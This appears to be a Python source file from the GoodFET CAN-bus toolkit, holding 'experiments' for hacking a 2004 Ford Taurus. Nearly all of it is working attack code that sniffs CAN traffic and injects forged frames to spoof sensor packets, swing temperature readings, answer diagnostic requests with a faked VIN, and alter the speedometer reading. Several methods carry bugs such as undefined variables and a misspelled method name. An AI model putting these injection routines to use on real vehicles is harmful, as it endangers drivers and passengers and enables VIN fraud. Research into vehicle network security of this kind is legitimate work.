import sys;
import binascii;
import array;
import csv, time, argparse;
import datetime
import os
from random import randrange
from GoodFETMCPCAN import GoodFETMCPCAN;
from experiments import experiments
from GoodFETMCPCANCommunication import GoodFETMCPCANCommunication
from intelhex import IntelHex;
import Queue
import math

tT = time
class FordExperiments(experiments):
    """
    This class is a subclass of experiments and is a car specific module for 
    demonstrating and testing hacks. 
    """
    def __init__(self, dataLocation = "../../contrib/ThayerData/"):
        GoodFETMCPCANCommunication.__init__(self, dataLocation)
        #super(FordExperiments,self).__init__(self) #initialize chip
        self.freq = 500;

    def mimic1056(self,packetData,runTime):
        #setup chip
        self.client.serInit()
        self.spitSetup(self.freq)
        #FIGURE out how to clear buffers
        self.addFilter([1056, 1056, 1056, 1056,1056, 1056], verbose=False)
        packet1 = self.client.rxpacket();
        if(packet1 != None):
            packetParsed = self.client.packet2parsed(packet1);
        #keep sniffing till we read a packet
        while( packet1 == None or packetParsed.get('sID') != 1056 ):
            packet1 = self.client.rxpacket()
            if(packet1 != None):
                packetParsed = self.client.packet2parsed(packet1)
        recieveTime = time.time()
        packetParsed = self.client.packet2parsed(packet1)
        if( packetParsed['sID'] != 1056):
            print "Sniffed wrong packet"
            return
        countInitial = ord(packetParsed['db3']) #initial count value
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            if(packetData.get(idx) == None):
                packet.append(ord(packetParsed.get(idx)))
            else:
                packet.append(packetData.get(idx))
        print packet
        #### split SID into different regs
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        tpast = time.time()
        while( (time.time()-recieveTime) < runTime):
            #care about db3 or packet[8] that we want to count at the rate that it is
            dT = time.time()-tpast
            if( dT/0.2 >= 1):
                db3 = (countInitial + math.floor((time.time()-recieveTime)/0.2))%255
                packet[8] = db3
                self.client.txpacket(packet)
                packetCount += 1
            else:
                packetCount += 1
                self.client.MCPrts(TXB0=True)
            tpast = time.time()  #update our transmit time on the one before   
            
                
         
    def cycledb1_1056(self,runTime):
        #setup chip
        self.client.serInit()
        self.spitSetup(500)
        #FIGURE out how to clear buffers
        self.addFilter([1056, 1056, 1056, 1056,1056, 1056], verbose=False)
        packet1 = self.client.rxpacket();
        if(packet1 != None):
            packetParsed = self.client.packet2parsed(packet1);
        #keep sniffing till we read a packet
        while( packet1 == None or packetParsed.get('sID') != 1056 ):
            time.sleep(.1)
            packet1 = self.client.rxpacket()
            if(packet1 != None):
                packetParsed = self.client.packet2parsed(packet1)
        recieveTime = time.time()
        packetParsed = self.client.packet2parsed(packet1)
        if( packetParsed['sID'] != 1056):
            print "Sniffed wrong packet"
            return
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            packet.append(ord(packetParsed.get(idx)))
        packetValue = 0
        packet[1] = packetValue;
        
        print packet
        #### split SID into different regs
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        tpast = time.time()
        while( (time.time()-recieveTime) < runTime):
            #care about db3 or packet[8] that we want to count at the rate that it is
            dT = time.time()-tpast
            packetValue += 10
            pV = packetValue%255
            #temp = ((packetValue+1))%2
            #if( temp == 1):
            #    pV = packetValue%255
            #else:
            #    pV = 0
            packet[6] = pV
            #packet[6] = 1
            print packet
            self.client.txpacket(packet)
            packetCount += 1
            tpast = time.time()  #update our transmit time on the one before   
        print packetCount;
        
    def getBackground(self,sId):
        packet1 = self.client.rxpacket();
        if(packet1 != None):
            packetParsed = self.client.packet2parsed(packet1);
        #keep sniffing till we read a packet
        while( packet1 == None or packetParsed.get('sID') != sId ):
            packet1 = self.client.rxpacket()
            if(packet1 != None):
                packetParsed = self.client.packet2parsed(packet1)
            
        #recieveTime = time.time()
        return packetParsed

    def cycle4packets1279(self):
        self.client.serInit()
        self.spitSetup(500)
        # filter on 1279
        self.addFilter([1279, 1279, 1279, 1279, 1279, 1279], verbose = False)
        packetParsed = self.getBackground(1279)
        packet = []
        if (packetParsed[db0] == 16):
            # if it's the first of the four packets, replace the value in db7  with 83
            packetParsed[db7] = 83
            # transmit new packet
            self.client.txpacket(packetParsed)
        else:
        # otherwise, leave it alone
            # transmit same pakcet we read in
            self.client.txpacket(packetParsed)
        # print the packet we are transmitting
        print packetParsed
        
        
    def oscillateTemperature(self,time):
        #setup chip
        self.client.serInit()
        self.spitSetup(500)
        #FIGURE out how to clear buffers
        self.addFilter([1056, 1056, 1056, 1056,1056, 1056], verbose=False)
        packetParsed = self.getBackground(1056)
        packet = []
        #set data packet to match what was sniffed or at least what was input
        for i in range(0,8):
            idx = "db%d"%i
            packet.append(ord(packetParsed.get(idx)))
        packetValue = 0
        packet[1] = packetValue;
        
        print packet
        #### split SID into different regs
        SIDlow = (1056 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (1056 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
        packet = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
        packetCount = 1;
        self.client.txpacket(packet);
        startTime = tT.time()
        while( (tT.time()-startTime) < runTime):
            dt = tT.time()-startTime
            inputValue = ((2.0*math.pi)/20.0)*dt
            value = 30*math.sin(inputValue)+130
            print value
            #packet[5] = int(value)
            if( value > 130 ):
                packet[5] = 160
            else:
                packet[5] = 100
            #packet[6] = 1
            print packet
            self.client.txpacket(packet)
            packetCount += 1
            #tpast = time.time()  #update our transmit time on the one before   
        print packetCount;
        
        
    def fakeVIN(self):
       #reset eveything on the chip
       self.client.serInit() 
       self.reset()
       duration = 20; #seconds 
       
       listenID = 2015
       listenPacket = [2, 9, 6, 153, 153, 153, 153, 153]
       responseID = 2024
       #actual response by the car
       #r1 = [34, 88, 0, 0, 0, 0, 0, 0]
       #r2 = [33, 75, 50, 78, 51, 46, 72, 69 ]
       #r3 = [16, 19, 73, 4, 1, 70, 65, 66]
       
       r1 = [34, 88, 0, 0, 0, 0, 0, 0]
       r2 = [33, 75, 50, 78, 51, 46, 72, 69 ]
       r3 = [16, 19, 73, 160, 159, 70, 65, 66]
       
       #format
       SIDlow = (responseID & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
       SIDhigh = (responseID >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
       packet1 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 r1[0],r1[1],r1[2],r1[3],r1[4],r1[5],r1[6],r1[7]]
       packet2 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
              0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 r2[0],r2[1],r2[2],r2[3],r2[4],r2[5],r2[6],r2[7]]
       packet3 = [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                  0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                  # lower nibble is DLC                   
                 r3[0],r3[1],r3[2],r3[3],r3[4],r3[5],r3[6],r3[7]]

       self.multiPacketSpit(packet0 = r1, packet1 = r2, packet2 = r3, packet0rts = True, packet1rts = True, packet2rts = True)

       #filter for the correct packet
       self.filterForPacket(listenID, listenPacket[0],listenPacket[1], verbose = True)
       self.client.rxpacket()
       self.client.rxpacket() # flush buffers if there is anything
       startTime = tT.time()
       while( (tT.time() -startTime) < duration):
           packet = self.client.rxpacket()
           if( packet != None):
               sid =  ord(packet[0])<<3 | ord(packet[1])>>5
               if( sid == listenID):
                   byte3 = ord(packet[6])
                   if( byte3 == listenPacket[3]):
                       print "SendingPackets!"
                       #send packets
                       self.multpackSpit(packet0rts=True,packet1rts=True,packet2rts=True)
                       
    def speedometerHack(self, inputs):
        
        self.client.serInit()
        self.spitSetup(500)

        self.addFilter([513, 513, 513])
        
        SIDlow = (513 & 0x07) << 5;  # get SID bits 2:0, rotate them to bits 7:5
        SIDhigh = (513 >> 3) & 0xFF; # get SID bits 10:3, rotate them to bits 7:0
                
        while(1):
            
            packet = None;

            # catch a packet and check its db4 value
            while (packet == None):
                packet=self.client.rxpacket();
                
            print "DB4 = %d" %packet[9]
            mph = 1.617*packet[9] - 63.5
            print "Current MPH = 1.617(%d)-63.5 = %d" %(packet[9], mph)
                
            # calculate our new mph and db4 value
            mph = mph + inputs[0];
            packet[9] = ( mph + 63.5 ) / 1.617

            # load new packet into TXB0 and check time
            self.multiPacketSpit(packet0=packet, packet0rts=True)
            starttime = time.time()
            
            # spit new value for 1 second
            while (time.time()-starttime < 1):
                self.multiPacketSpit(packet0rts=True)
            


            [SIDhigh, SIDlow, 0x00,0x00, # pad out EID regs
                      0x08, # bit 6 must be set to 0 for data frame (1 for RTR) 
                      # lower nibble is DLC                   
                      packet[0],packet[1],packet[2],packet[3],packet[4],packet[5],packet[6],packet[7]]
    
    
#        while((time.time()-starttime < duration)):
#                    
#                    if(faster):
#                        packet=self.client.fastrxpacket();
#                    else:


       
        
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description='''\

    Run Hacks on a Ford taurus 2004:
        
            speedometerHack
            fakeVIN
        ''')
    parser.add_argument('verb', choices=['speedometerHack']);
    parser.add_argument('-v', '--variable', type=int, action='append', help='Input values to the method of choice', default=None);


    args = parser.parse_args();
    inputs = args.variable
    fe = FordExperiments("../../contrib/ThayerData/");
    
    if( args.verb == 'speedometerHack'):
        fe.speedometerHack(inputs=inputs)
    elif( args.verb == 'fakeVIN'):
        fe.fakeVIN()
        
        